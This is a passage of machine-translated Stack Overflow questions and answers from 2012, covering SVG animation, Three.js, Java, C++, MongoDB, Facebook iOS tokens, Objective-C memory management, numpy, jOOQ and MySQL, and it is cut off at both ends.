我相信 bourne shell 中的 '^' 被允许作为向后兼容的版本/等效的 '|' 字符。

你看到的信息似乎支持这种解释。

`offset`要确认，请制作一个仅打印“必须偏移”以查看的测试脚本。

（向后兼容此 ol' SunOS3 编码器中丢失的内容`/dev/null`；-)）

IHTH。

# animation - 可以强制继承 SVG 中的动画元素吗？

> ID：13125409
> 
> 赞同：1
> 
> 时间：2012-10-29T16:10:19.107
> 
> 标签：animation, inheritance, svg

嗨，我有以下 SVG 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="150" height="150" viewBox="0 0 150 150">

    <text x="10" y="100" fill="blue" fill-opacity="1">
        <tspan fill-opacity="1" >1st</tspan>
        <tspan                  >2nd</tspan>
        <animate attributeName="fill-opacity" calcMode="discrete" values="0; 1" dur="1s" repeatCount="indefinite"/>
    </text>

</svg> 
```

如您所见，`animate`元素中有一个元素`text`，效果很好。然而，问题在于`tspan`元素。其中之一定义 no `fill-opacity`（由动画更改的属性）并继承动画。另一个定义了自己的`fill-opacity`，不会被动画改变。

有没有办法告诉`animate`元素它应该影响所有子元素，而不管它们是否为更改的属性定义了自己的值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:28:23.373

不。fill-opacity 是 CSS 属性，因此适用于[CSS 特定](http://snook.ca/archives/html_and_css/understanding_c)性。更具体的子规则将始终适用。你当然可以给 tspan 它自己的动画。

# javascript - 我怎样才能让我的网格离开屏幕？

> ID：13125415
> 
> 赞同：0
> 
> 时间：2012-10-29T16:10:33.567
> 
> 标签：javascript, graphics, position, webgl, three.js

我无法弄清楚如何检测它是否会离开屏幕，有人可以帮忙吗？我正在使用 WebGL 和 Three.js。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T17:05:13.480

您可以使用[Frustum](https://github.com/mrdoob/three.js/blob/master/src/core/Frustum.js)测试，有点像这样：

```
// Create a new Frustum object (for efficiency, do this only once)
var frustum = new THREE.Frustum();
// Helper matrix (for efficiency, do this only once) 
var projScreenMatrix = new THREE.Matrix4();

// Set the matrix from camera matrices (which are updated on each renderer.render() call)
projScreenMatrix.multiply( camera.projectionMatrix, camera.matrixWorldInverse );
// Update the frustum
frustum.setFromMatrix( projScreenMatrix );
// Test for visibility
if ( !frustum.contains( object ) ) {
    // It's off-screen!
} 
```

这是从[WebGLRenderer 来源](https://github.com/mrdoob/three.js/blob/06a19706f1adac06a16c1b826438e391eec7d343/src/renderers/WebGLRenderer.js#L3640)复制的。

# xpages - 从csjs调用重复控制？

> ID：13125417
> 
> 赞同：0
> 
> 时间：2012-10-29T16:10:39.643
> 
> 标签：xpages

如果我从 ssjs 成功调用的代码，我有这一点

```
 "vwEquipmentActiveByCategorySubcategoryBriefDescription/"+rowData.getUniversalID() +"/$FILE/"+rowData.getColumnValues()[4] 
```

现在我需要从 csjs 调用它。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T13:27:26.470

我最终在这里做的是使用点击事件 SSJS 获取图像 URL（从重复控件计算）并将其存储在 CSS 隐藏字段中。然后我的 CSJS 引用该字段。效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T18:03:21.827

客户端有一个 XSP 对象，它允许您对服务器进行少量回调。

所以尝试使用这个

```
XSP.partialRefreshGet(refreshId, options) or XSP.partialRefreshPost(refreshId, options) 
```

手动触发部分刷新。对于 POST，refreshId 必须指向一个表单，对于 get 它可以是任何具有部分刷新定义的元素。options 对象检查起来非常有趣。包括要在生命周期中执行的参数和函数。

因此，只需输入重复控件的 ID 和 XSP.partialRefreshGet 或 Post 并检查它是否有效。如果您将控件放在面板中并将面板的 ID 传递给刷新方法，那么它肯定会起作用。

# java - 数据库 IN 的 Java 等价物

> ID：13125418
> 
> 赞同：0
> 
> 时间：2012-10-29T16:10:40.533
> 
> 标签：java, keyword, list-literal

我一直想知道为什么 java 没有在 SQL/PL-SQL 中使用的任何关键字，如“IN”。这是一个非常有用的关键字，有助于一次将值与其他几个值进行比较，而不是用 || 编写丑陋的代码。或冗长的 if-else！JSR 中有这样的命题吗？

PS：我不是在寻找解决方法，但我想知道是否有任何特殊原因导致此功能在 java 中不存在或在不久的将来有任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:20:43.983

我还没有看到任何将其添加到 Java 的坚定建议。有一篇[博客文章](http://blog.joda.org/2007/02/java-7-list-and-map-literals_6278.html)（和[另](http://multiple-hats.blogspot.co.uk/2009/11/jdk7-closures-dynamic-typing-support-in.html)一篇文章）讨论了添加列表文字的可能性，这将使您在大多数情况下使用`contains()`- 这似乎已经针对 Java 7 进行了讨论，但没有被采用。

**更新：**看起来列表文字已被推迟到 Java 8 - 例如，请参阅[这篇文章](http://code.joejag.com/2009/new-language-features-in-java-7/)。

您可以使用 varargs 定义帮助程序，而不是使用`contains()`和直接使用数组文字或列表：

```
boolean in(Object o, Object... vals)
{
    return Arrays.asList(vals).contains(o);
} 
```

这样你就可以做到：

```
if (in(x, "a", "b", "c"))
{
    // Do something
} 
```

`IN`但与 SQL或 Python相比，这仍然有点丑陋和冗长：

```
if x in ['a','b','c']:
    print "yes" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:21:49.583

我会做类似的事情，

```
List<String> values = ArrayLists.create("AVALUE", "BVALUE");

if (values.contains(yourValue))
// Do whatever 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:15:30.763

但是Java可以很容易地连接到数据库（JDBC）。您确实有一个[for-each](http://docs.oracle.com/javase/1.5.0/docs/guide/language/foreach.html)构造，尽管它很有帮助并且类似于`IN`：

```
for (Suit suit : suits)
    for (Rank rank : ranks)
        sortedDeck.add(new Card(suit, rank)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:16:09.820

在 Java 中，您可以创建一个集合并使用方法[`boolean contains(Object o)`](http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html#contains%28java.lang.Object%29)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:16:13.203

在收藏中

[Collection.contains(对象 obj)](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collection.html#contains%28java.lang.Object%29)

在 String 你有[String.contains(CharSequence c)](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#contains%28java.lang.CharSequence%29)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-29T16:18:26.697

我认同，

这确实是一个缺失的功能。

例如：

```
String[] list = new String[]{"Tim","Tammy","Tod"};
if("Ted" in list){
    System.out.println("Found!");
} 
```

真的很容易理解。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-29T16:15:11.347

`java.util.Collection`有方法`contains`，`containsAll`可以完成工作，但很难从你的问题中分辨出来。

# c++ - 字符串文字的最大长度？

> ID：13125419
> 
> 赞同：6
> 
> 时间：2012-10-29T16:10:43.153
> 
> 标签：c++, string, literals

我正在尝试创建一个长字符串文字，我将其存储在 std::string 中。如果我创建一个最多大约 2600 个字符的文字，那么一切都很好。如果我超出了符号的数量，我只会打印一些随机的垃圾字符。

我一直使用 C 标准作为指导，环境限制被指定为“字符串文字中的 4095 个字符（连接后）”。但是代码是用 C++ 编写的。

所以我的问题是，C++ 字符串文字中的最少字符数是多少？

（问题可能在代码的其他地方，但我想确保我没有通过标准设置的限制。文本打印在 RichEdit 控件中，所以我怀疑是罪魁祸首。）

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-29T16:13:31.017

最小值在

**附件 B
实施数量[限制]**

> 字符串文字中的字符（连接后）[65 536]。

但请注意：

> 1) 由于计算机是有限的，C++ 实现不可避免地受限于它们可以成功处理的程序的大小。**每个实施都应在已知的情况下记录这些限制。**本文档可能会引用存在的固定限制，说明如何根据可用资源计算可变限制，或者说固定限制不存在或未知。
> 
> 2) 限制可能会限制包括以下描述的数量或其他数量。建议将每个数量后面的括号中的数字作为该数量的最小值。但是，**这些数量仅作为指导，并不能确定合规性**。（强调我的）

不过，您的实现应该为您提供这个数字。

# php - 新的 MongoDB 安装，单次插入导致重复文档

> ID：13125426
> 
> 赞同：4
> 
> 时间：2012-10-29T16:11:16.053
> 
> 标签：php, macos, mongodb

我已经在我的 Mac 上设置了 MongoDB，并且正在使用 PHP 与之通信。我已经为 Mongo 安装了 PHP 驱动程序，并且成功连接并从数据库中进行插入和选择。

我遇到的问题是，当我在 Mongo 中插入时，我看到了文档的 2 个副本，即使我只调用了一次插入函数。

这是php代码：

```
 <?php
    $mongoDB = new Mongo();
    $db = $mongoDB->blog;
    $collection = $db->posts;
    $document = array( "title" => "cat with a hat", "body" => "once upon a time a cat with a hat ...");
    $collection->insert($document); 
```

数据库中的结果是：

```
> db.posts.find()
{ "_id" : ObjectId("5089ff5aaa3479c97300000f"), "title" : "cat with a hat", "body" : "once upon a time a cat with a hat ..." }
{ "_id" : ObjectId("5089ff5aaa3479c973000011"), "title" : "cat with a hat", "body" : "once upon a time a cat with a hat ..." } 
```

我不确定这是否与 PHP 驱动程序、Mongo、Apache 或我的操作系统有关。我使用 Brew 安装 Mongo 和 PECL 安装 mongo 驱动程序（pecl install mongo）。

为什么我在插入 Mongo 时会得到 2 个副本？

编辑：修正了 php 代码中的错字。谢谢 bcmcfc

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:13:54.753

您应该尝试使用 upsert：

[http://php.net/manual/en/mongocollection.insert.php](http://php.net/manual/en/mongocollection.insert.php)

# iphone - iOS 6 Facebook登录不刷新访问令牌

> ID：13125430
> 
> 赞同：3
> 
> 时间：2012-10-29T16:11:18.170
> 
> 标签：iphone, objective-c, facebook, ios6, facebook-access-token

我正在阅读的任何内容（许多 FB 开发文章和 SO 问题）都没有帮助，所以我想我会在这里发帖。我试图让这一切都与 iOS 6 和 Facebook SDK 3.1.1 一起工作。

我有一个非常基本的设置：我的 iOS 应用程序通过 Facebook 进行身份验证，我将 access_token 传递给我的服务器，用户现在已登录到我的应用程序。他们唯一能做的与 facebook 相关的事情就是在他们的墙上贴一些东西。我正在使用旧版 Dialog 窗口，因此用户可以添加自己的评论。

在第一个小时左右的新安装中，一切都可以完美运行。如果用户通过 iOS 设置应用程序登录，他们会看到一个快速的 iOS 确认框，我得到他们的令牌，将其发送到我的服务器，我们都很好。

如果我将收到的令牌粘贴到 Facebook 的 Access Token 调试器中，它会显示它将在一小时后过期。

如果我等了那个小时然后回到应用程序，我尝试做的任何事情都会给我这个错误：

```
{"error_code":190,"
  error_msg":"Error validating access token: 
              Session has expired at unix time 1351497600\. 
              The current unix time is 1351525180\. } 
```

1.  我需要做什么才能使事情正常进行？[我](https://stackoverflow.com/questions/12601191/facebook-sdk-3-1-error-validating-access-token/)在 SDK 3.1.1 中读过 FBSession 会处理它，但情况似乎并非如此。我的访问令牌即将到期，一旦到期，iOS/FB SDK 将不会给我一个更新的令牌。
2.  即使注销（调用`[FBSession.activeSession closeAndClearTokenInformation]`）也无法解决此问题。我唯一能做的就是在 iOS 模拟器首选项中“重置内容和设置”，在 Settings.app 中重新输入我的 FB 凭据，然后重建我的应用程序。只有这样我才能获得另一个将在一小时内到期的令牌。

散记：

1.  当我的应用程序恢复时，我正在`[FBSession.activeSession handleDidBecomeActive]`打电话`[self.facebook extendAccessTokenIfNeeded]`
2.  根据上面链接的 SO 问题，SDK 应该会自动调用`FBSession#renewSystemAuthorization`. 我已经在其中放置了一个 NSLog，但我从未看到该方法被调用。

**更新#1**：

我提到我已经读过 SDK 将处理无效/过期的令牌。这似乎应该发生在 FBRequestConnection#completeWithResults:orError: 中。有关代码路径的注释，请参见内联注释。

```
- (void)completeWithResults:(NSArray *)results
                orError:(NSError *)error
{
    int count = [self.requests count];
    for (int i = 0; i < count; i++) {
        FBRequestMetadata *metadata = [self.requests objectAtIndex:i];
        id result = error ? nil : [results objectAtIndex:i];
        NSError *itemError = error ? error : [self errorFromResult:result];

        id body = nil;
        if (!itemError && [result isKindOfClass:[NSDictionary class]]) {
            NSDictionary *resultDictionary = (NSDictionary *)result;
            body = [FBGraphObject graphObjectWrappingDictionary:[resultDictionary objectForKey:@"body"]];
        }

        ...

        // *******************************************
        // My code actually falls into this block, proving that I do in fact have an invalid session
        // *******************************************
        if ([self isInvalidSessionError:itemError
                        resultIndex:error == itemError ? i : 0]) {
            [metadata.request.session closeAndClearTokenInformation:itemError];

            // *******************************************
            // Unfortunately metadata.request.session is nil, so this condition is never
            // run, so renewySystemAuthorization is never called
            // *******************************************
            if (metadata.request.session.loginType == FBSessionLoginTypeSystemAccount){
                [FBSession renewSystemAuthorization];
        }
    }

    ...
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T22:14:48.827

这不是我所追求的修复类型，但事情看起来按预期工作，所以此时我只需要发货。

首先，事实证明我们的应用程序的旧版本正在请求offline_access。我不知道。我进入了我的 FB 应用程序的设置 > 高级，并启用了“删除离线访问权限”。我现在要取回一个持续两个月的令牌（[查看 facbeook 令牌调试器](https://developers.facebook.com/tools/debug)）。

现在我取回了正确类型的令牌，但当它被停用/过期时，我仍然无法取回有效令牌。因为我现在要取回一个 2 个月的令牌，所以我等不及它过期了，所以我的计划是通过进入我的帐户设置并取消授权来触发 OAuthException。

在我的 appDidBecomeActive 中，我将 [FBRequestConnection startForMeWithCompletionHandler:nil] 用于简单地触发对 FB 的静默请求，当由于无效会话/令牌而失败时，代码流将通过正确的路径运行，并且 [FBSession renewSystemAuthorization] 最终被调用，这最终是我所需要的。这允许 iOS 做的是下次我通过 FB 登录到我的应用程序时，iOS 再次提示我，了解我不再拥有有效的令牌。调用 [FBSession renewSystemAuthorization] 有效地告诉 iOS，下次我的应用程序请求访问时，点击 facebook 并给我一个新的/刷新的令牌。

在大多数情况下，现在一切都按预期工作。

# objective-c - 潜在的内存泄漏或引用计数的不正确递减

> ID：13125434
> 
> 赞同：0
> 
> 时间：2012-10-29T16:11:36.437
> 
> 标签：objective-c, memory-management

我有这个方法

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        UIWebView *t_webView = [[UIWebView alloc] initWithFrame:CGRectMake(0, 44, 
                                                                       320,480)];
        self.webView = t_webView;
        self.accel = [[Accelerometer alloc]init];

        //Potential Memory Leak here
        NSURL *theurl = [NSURL fileURLWithPath:[[NSBundle mainBundle] pathForResource:@"second" ofType:@"html" inDirectory:@"www"]];
        [self.webView loadRequest:[NSURLRequest requestWithURL:theurl]];
        [self.view addSubview:webView];

        [theurl release];//When I add this line, the Memory Leak Warning disappears, but instead I get a "incorrect Decrement of reference count
        theurl = nil;

        [t_webView release];
    }

    return self;
 } 
```

我想我对内存管理一无所知，有人可以帮助我如何避免警告吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T20:12:05.110

```
NSURL *theurl = [NSURL fileURLWithPath:[[NSBundle mainBundle] pathForResource:@"second" ofType:@"html" inDirectory:@"www"]]; 
```

这将返回一个自动释放的对象。 `release`稍后在该方法中使用它是不正确的。

泄漏是`self.accel = [[Accelerometer alloc]init];`; +alloc 意味着 a`retain`并且对保留属性的分配是另一个。我会建议：

```
Accelerometer *acc = [[Accelerometer alloc]init];
self.accel = acc;
... do stuff with `acc` ...
[acc release]; 
```

如果编译器警告来来去去 / `[theurl release]`，那听起来像是一个分析器错误。

# objective-c - JSONKit 是否会造成内存泄漏？

> ID：13125442
> 
> 赞同：4
> 
> 时间：2012-10-29T16:12:29.917
> 
> 标签：objective-c, memory-leaks, xcode4.5, jsonkit

我一直在我的应用程序中使用[JSONKit](https://github.com/johnezang/JSONKit)，但现在我已经升级到 Xcode 4.5.1 并运行分析，Xcode 报告 JSONKit 代码中可能存在内存泄漏。

`/Users/aleksa.topic/SVN/Apple/iTTChart/trunk/iTTChart/Other Sources/JSONKit.m:682:23: Memory is never released; potential leak of memory pointed to by 'array'` （并且它为字典提供了相同的潜在泄漏）。

有没有人有这方面的经验？是真的造成内存泄漏还是只是 Xcode 的分析不够好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:18:16.137

这是静态分析器中的误报。有一个[错误报告](https://github.com/johnezang/JSONKit/issues/98)试图解决它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-24T09:42:24.650

请参阅此[链接](https://github.com/shazron/JSONKit/commit/5c330695e8b689e6ffb5b79db23cb630b0e921f8)。只需将标记为 - 的行替换为标记为 + 的行。

```
-    if((array = [array init]) == NULL) { return(NULL); }
+    if([array init] == NULL) { free(array); return(NULL); } 
```

* * *

```
-    if(JK_EXPECT_F((array->objects = (id *)malloc(sizeof(id) * array->capacity)) == NULL)) { [array autorelease]; return(NULL); }
+    if(JK_EXPECT_F((array->objects = (id *)malloc(sizeof(id) * array->capacity)) == NULL)) { free(array); return(NULL); } 
```

* * *

```
-    if((dictionary = [dictionary init]) == NULL) { return(NULL); }
+    if([dictionary init] == NULL) { free(dictionary);return(NULL); } 
```

* * *

```
-    if(JK_EXPECT_F((dictionary->entry = (JKHashTableEntry *)calloc(1UL, sizeof(JKHashTableEntry) * dictionary->capacity)) == NULL)) { [dictionary autorelease]; return(NULL); }
+    if(JK_EXPECT_F((dictionary->entry = (JKHashTableEntry *)calloc(1UL, sizeof(JKHashTableEntry) * dictionary->capacity)) == NULL)) { free(dictionary); return(NULL); } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-02T07:52:24.907

替换`((array = [array init]) == NULL)`为`(dictionary == NULL)`并使用`free(array)`函数而不是`[array autorelease]`修复它。因为它是手动分配的，所以它也应该手动释放。

# d - 将字符串 [] 转换为 char**

> ID：13125446
> 
> 赞同：4
> 
> 时间：2012-10-29T16:12:50.387
> 
> 标签：d

假设我想将一组命令行选项转发给一个 C 函数，声明如下，其中 D main 接受 args

```
extern (C) void init(int argc, char** argv);

void main(string[] args) {
    init(args.length, map!(toStringz)(args));
} 
```

第一个参数很简单，但我尝试应用于`toStringz`数组`args`似乎不起作用。我明白了`cannot implicitly convert expression (map(args)) of type MapResult!(toStringz,string[]) to char**`。您如何转换`string[]`为`char**`（或什至`const(char)**`）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:21:25.183

`std.algorithm.map`函数返回范围，在您的情况下必须将其更改为数组。您可以使用[`std.array.array`](http://dlang.org/phobos/std_array.html#array). 然后你可以使用`.ptr`. 它返回`immutable(char**)`被转换为`char**`：

```
extern (C) void init(int argc, char** argv);

void main(string[] args) {
    init(cast(int)args.length, cast(char**)map!(toStringz)(args).array.ptr);
} 
```

这是现场演示：[http ://dpaste.dzfl.pl/ff81984c](http://dpaste.dzfl.pl/ff81984c)

# python - Python 等价于 Matlab textscan

> ID：13125447
> 
> 赞同：11
> 
> 时间：2012-10-29T16:12:50.617
> 
> 标签：python, matlab, numpy, textscan

我正在将一些 Matlab 代码传输到 Python。我对 Python 比较陌生，并且不确定 Python 等效于 Matlab 的[`textscan`](http://www.mathworks.com/help/matlab/ref/textscan.html)方法。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-29T16:49:19.173

如果您要将 Matlab 翻译成 Python，我会假设您已经在使用 NumPy。

在这种情况下，您可以使用[`np.loadtxt`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.loadtxt.html#numpy.loadtxt)（如果没有缺少值）或[`np.genfromtxt`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.genfromtxt.html#numpy-genfromtxt)（如果缺少值：我不确定 Matlab 是否`textscan`可以处理）。

如果您需要更多帮助，请向我们提供更多详细信息！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-04-13T19:17:29.183

将 MATLAB 转换`textscan`为 Python + NumPy 的示例[`np.loadtxt`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.loadtxt.html#numpy.loadtxt)：

让我们的数据文件`results.csv`包含：

```
0.6236,sym2,1,5,10,10
0.6044,sym2,2,5,10,10
0.548,sym2,3,5,10,10
0.6238,sym2,4,5,10,10
0.6411,sym2,5,5,10,10
0.7105,sym2,6,5,10,10
0.6942,sym2,7,5,10,10
0.6625,sym2,8,5,10,10
0.6531,sym2,9,5,10,10 
```

Matlab代码：

```
fileID = fopen('results.csv');
d = textscan(fileID,'%f %s %d %d %d %d', 'delimiter',',');
fclose(fileID); 
```

Python + NumPy 代码：

```
fd = open('results2.csv','r')    
d = np.loadtxt(fd,
           delimiter=',',
           dtype={'names': ('col1', 'col2', 'col3', 'col4', 'col5', 'col6'),
           'formats': ('float', 'S4', 'i4', 'i4', 'i4', 'i4')})
fd.close() 
```

有关类型的详细信息，请参阅[数据类型对象 (dtype)](http://docs.scipy.org/doc/numpy/reference/arrays.dtypes.html)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-29T16:22:39.163

你必须寻找 Numpy 和 py2mat。如果我对 textscan() 的理解是正确的，您可以使用`open()`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-07-17T19:12:59.103

如果您的结果比简单的分隔文本更复杂，例如如果混入了其他无用的文本，那么您可以使用 Numpy 的[`fromregex`](https://docs.scipy.org/doc/numpy/reference/generated/numpy.fromregex.html#numpy.fromregex)函数替换`textscan`. `fromregex`让您可以基于正则表达式读取，其中组（由 包围的部分`()`）作为值。

例如，假设您有这样的行：

```
field1 is 1, field 2 is 5 to 6.6
field1 is 2, field 2 is 7 to 0.1 
```

并且您想获取值数字（而不是字段名称）：

```
[[1, 5, 6.6],
 [2, 7, 0.1]] 
```

你可以做

```
data = np.fromregex('temp.txt', r'field1 is ([\d\.]+), field 2 is ([\d\.]+) to ([\d\.]+)', dtype='float') 
```

`[\d\.]+`匹配任何数字，包括小数位，并且告诉 numpy将该`()`结果用作值。您还可以指定更复杂的 dtype，例如让不同的列具有不同的类型，以及指定列名以提供结构化数组。文档中对此进行了介绍。

但是，在处理简单的定界或固定宽度数据时，它比其他方法更复杂。

# java - 带有例程生成的 Jooq MySQL 编译错误

> ID：13125453
> 
> 赞同：1
> 
> 时间：2012-10-29T16:13:05.313
> 
> 标签：java, mysql, jooq

我在我的应用程序中使用 Jooq 作为 SQL 层。它可以很好地生成代码/pojos/records/routines，但是 MySQL 程序所在的 Routines.java 无法编译，因为它生成了一个重复的方法：

Routines.java 第 989 行：

```
/**
 * Call mmw.logMsg
 *
 * @param __Message
 * @param __Code
 * @param __Ean
 * @param __Erpnumber
 * @param __Proc
 * @throws org.jooq.exception.DataAccessException if something went wrong executing the query
 */
public static java.lang.Byte logmsg(org.jooq.Configuration configuration, java.lang.String __Message, java.lang.String __Code, java.lang.String __Ean, java.lang.String __Erpnumber, java.lang.String __Proc) {
  com.mycompany.data.routines.Logmsg f = new com.mycompany.data.routines.Logmsg();
  f.set__Message(__Message);
  f.set__Code(__Code);
  f.set__Ean(__Ean);
  f.set__Erpnumber(__Erpnumber);
  f.set__Proc(__Proc);

  f.execute(configuration);
  return f.getReturnValue();
} 
```

Routines.java 第 1061 行：

```
/**
 * Call mmw.logMsg
 *
 * @param __Message IN parameter
 * @param __Code IN parameter
 * @param __Ean IN parameter
 * @param __Erpnumber IN parameter
 * @param __Proc IN parameter
 * @throws org.jooq.exception.DataAccessException if something went wrong executing the query
 */
public static void logmsg(org.jooq.Configuration configuration, java.lang.String __Message, java.lang.String __Code, java.lang.String __Ean, java.lang.String __Erpnumber, java.lang.String __Proc) {
  com.mycompany.data.routines.Logmsg p = new com.mycompany.data.routines.Logmsg();
  p.set__Message(__Message);
  p.set__Code(__Code);
  p.set__Ean(__Ean);
  p.set__Erpnumber(__Erpnumber);
  p.set__Proc(__Proc);

  p.execute(configuration);
} 
```

错误：`Routines.java:[1061,20] error: method logmsg(Configuration,String,String,String,String,String) is already defined in class Routines`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:07:29.407

您的数据库中似乎有一个具有完全相同名称和完全相同签名的过程和函数...... jOOQ 不支持。

我为此创建了一个错误：
[https ://github.com/jOOQ/jOOQ/issues/1908](https://github.com/jOOQ/jOOQ/issues/1908)

作为一种解决方法，如果可以：

*   删除/重命名过程或函数
*   针对这种情况手动修补生成的代码

* * *

更新：此问题已在 jOOQ 3.2 中修复

# c++ - 函数指针中的 c++ 异常规范

> ID：13125454
> 
> 赞同：4
> 
> 时间：2012-10-29T16:13:08.550
> 
> 标签：c++, exception

**代码：**

```
#include<iostream>
using namespace std;

void foo() throw(char) {throw 'a';}

int main() try {

   void (*pf)() throw(float);
   pf = foo; // This should NOT work 
   pf();

}
catch(const char& c){cout << "Catched ::> " << c << endl;} 
```

为什么即使异常规范与函数指针所具有的不同，也可以传递`foo`给？这是我的编译器中的错误吗？`pf``foo``pf`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-29T16:17:10.633

**[异常规范不参与函数的类型。](http://www.gotw.ca/publications/mill22.htm)** 更正：正如其他答案中所指出的，这确实是一个编译器错误。众所周知，大多数编译器在实现异常规范方面存在缺陷。此外，它们在 C++11 中已被弃用。所以，

遵循 Herb Sutter 的异常规范建议：

> 道德#1：永远不要编写异常规范。
> 
> 道德＃2：除了可能是一个空的，但如果我是你，我什至会避免。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-29T16:36:45.820

是的，这是编译器错误。函数指针必须具有兼容的异常说明符才能赋值。

引用标准：

> **15.4 异常规范**
> 
> (5) ...类似的限制适用于函数指针、成员函数指针和函数引用的赋值和初始化：目标实体应至少允许赋值或初始化中源值允许的异常。

**例子：**

```
class A;

void (*pf1)(); // no exception specification
void (*pf2)() throw(A);

pf1 = pf2; // OK: pf1 is less restrictive
pf2 = pf1; // error: pf2 is more restrictive 
```

[您使用Comeau](http://www.comeaucomputing.com/tryitout/)编译的代码会`incompatible exception specifications`出现错误：

```
Comeau C/C++ 4.3.10.1 (Oct  6 2008 11:28:09) for ONLINE_EVALUATION_BETA2
Copyright 1988-2008 Comeau Computing.  All rights reserved.
MODE:strict errors C++ C++0x_extensions

"ComeauTest.c", line 9: error: incompatible exception specifications
  pf=foo; // This should NOT work 
    ^ 
```

正如许多其他人提到的，除了规范之外，C++11 标准（参见附录 D.4）中已弃用异常`noexcept`规范。所以最好的做法是（并且曾经） -**避免使用它**。

# android - 在 Android 中使用 where 条件查询

> ID：13125457
> 
> 赞同：0
> 
> 时间：2012-10-29T16:13:22.367
> 
> 标签：android, cursor, android-cursor

我想设置一个查询来获取包含特定字符串的名称（这里是约束）。所以我编码：

```
Cursor contactCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{Phone.DISPLAY_NAME}, Phone.DISPLAY_NAME + "like + ?", new String[]{"%"+constraint+"%"}, Phone.DISPLAY_NAME + " ASC"); 
```

但我得到了错误。我知道我很接近。我哪里错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:15:27.467

你有一个简单的错字。改变这个：

```
"like + ?" 
```

对此：

```
" like ?" 
```

（在前面添加一个空格并删除`+`）。

# c++ - 将 USB 主机桥接到设备

> ID：13125459
> 
> 赞同：8
> 
> 时间：2012-10-29T16:13:28.290
> 
> 标签：c++, c, linux, usb

简而言之，我正在开发一个嵌入式系统，除其他外，它需要从 USB 主机端口到设备端口的桥接（这只是第一步，稍后传输的信息将被过滤和更改）。

考虑到这基本上是一个 USB 窥探器/嗅探器，我认为应该有人编写了一个能够做到这一点的模块，但我的搜索证明是徒劳的。

那么，对于这个问题：在 Linux 中将 USB 主机重定向到 USB 设备的最简单方法是什么？数据必须相同，所有描述符和端点必须匹配。它必须是 Linux 友好的，我可以用 C/C++ 编写代码，并且在编写内核模块、驱动程序等方面有一些经验。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T09:12:04.933

[我在http://www.elinux.org/BeagleBoard/GSoC/2010_Projects/USBSniffer](http://www.elinux.org/BeagleBoard/GSoC/2010_Projects/USBSniffer)找到了以前的工作

在我看来，在 Linux 中将 USB 主机重定向到 USB 设备的最简单方法是同时使用 Linux 的外围 USB 堆栈和 Linux 的小工具 USB 堆栈。这些堆栈负责低级别，因此您的代码应该只关注这两个堆栈之间的高级接口。额外的好处是嗅探器（通过 usbmon）几乎是免费的。

由于这种方式将处理 Linux 内核，因此它必须是 Linux 友好的。两个堆栈的接口（至少）在 C 中可用。因此，您的条件得到满足。

# mysql - MySQL 一个查询中多个键的最新行

> ID：13125461
> 
> 赞同：2
> 
> 时间：2012-10-29T16:13:31.993
> 
> 标签：mysql, sql

我的数据库中有一个表，它定期收集信息。每行有一个序列号列 (SN) 和一个日期列 (ReadDate) 以及八个通道列 (ch1-ch8)。我想在一个查询中获取每个序列号的所有最新通道值。现在我的查询确实获取了所有序列号的所有通道。唯一的问题是我没有得到最新的值，看起来我正在抓取第一行。

[我已经在 sqlfiddle http://sqlfiddle.com/#!2/313cf/2](http://sqlfiddle.com/#!2/313cf/2)上放了一个我想要做的例子

关于我必须做些什么来获得每个序列号的最新通道值的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:16:25.320

```
SELECT a.*
FROM    dials a INNER JOIN
        (
          SELECT  SN, MAX(RealReadDate) maxDate
          FROM    dials
          GROUP BY SN
          ) b ON a.SN = b.SN AND
                a.RealReadDate = b.maxDATE 
```

# [SQLFiddle 演示](http://sqlfiddle.com/#!2/313cf/4)

# java - 用 gson 解析 instagram json

> ID：13125463
> 
> 赞同：0
> 
